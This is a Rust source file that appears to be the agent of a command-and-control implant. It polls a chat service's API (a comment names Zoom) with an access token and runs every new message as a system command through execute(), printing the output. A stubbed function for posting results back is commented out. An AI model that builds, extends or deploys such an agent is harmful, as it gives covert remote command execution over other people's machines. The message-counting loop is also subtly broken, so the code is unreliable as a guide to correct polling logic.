use reqwest;
use reqwest::Error;
use serde_json::{Value};
use serde;
use crate::operation::{execute};
use std::{thread, time::Duration};
use crate::main::config_parser;


use crate::Estruct::{Message, Root};


pub async fn httpGetRequest(host: &str, access_token:&str) -> Result<(),Error> {
    //loop to list message , if Found any new then do operation on top of it
    let client = reqwest::Client::new();
    let mut count_total_message = 0;
    let mut count_new_message = 0;
    loop {
        //let body = reqwest::get(host).header("abcd:def").await?;
        let response = client.get(host).header(String::from("Authorization"),access_token).send().await?;
        //println!("status is {}",response.status());
        //
        let body = &response.text().await?;
        //println!("{}",body);
        let root:Root = serde_json::from_str(&body).unwrap();
        let mut command: Vec<Message> = root.messages;

        //to count number of new messages
        count_new_message=command.len()-count_total_message;
        println!("Total number of message is {}",command.len());
        if command.len()==count_total_message {
            thread::sleep(Duration::from_secs(5));
            continue;
        }
        else {
            
        /*
            let new_msg = command.pop();
            match new_msg{
                Some(msg) => {
                    if msg.message.starts_with("access_token") {

                    }
                    else {
                        println!("[+]New Message found: {}",msg.message);
                        let resp : String = execute(&msg.message);
                        println!("Command Output: {}",resp);
                        thread::sleep(Duration::from_secs(1));
                    }
                }
                None => {
                    continue;
                }
            }
        */
            
            for msg in 0..count_new_message{
                let new_command: &Message = if count_new_message == 1 {
                    &command[0]
                } 
                else {
                    &command.pop().unwrap()
                };
                
                
                //let new_command = command.pop().unwrap();
                
                println!("New command is {}",new_command.message);
                if new_command.message.starts_with("access_token") {

                }
                else {
                    //let new_msg = command.pop().unwrap();
                    let resp : String = execute(&new_command.message);
 
                    thread::sleep(Duration::from_secs(1)); 
                    println!("final response is {}",resp);

                }
                count_new_message+=1;
                count_total_message+=1; 
                
                
                   
            }
            
        }
        //since the ate limit for zoom API call is 2 per second, we are calling sleep function for 4 s
        thread::sleep(Duration::from_secs(5));
        
    
    }
    Ok(())
} 

/*pub async fun httpPostRequest(resp: String) -> Result<(),Error>{
    let client = reqwest::Client::new();
    let mut config: configuration = config_parser();
    let host : String = config.endpoint;
    let mut access_token : String = config.access_token;



}
    */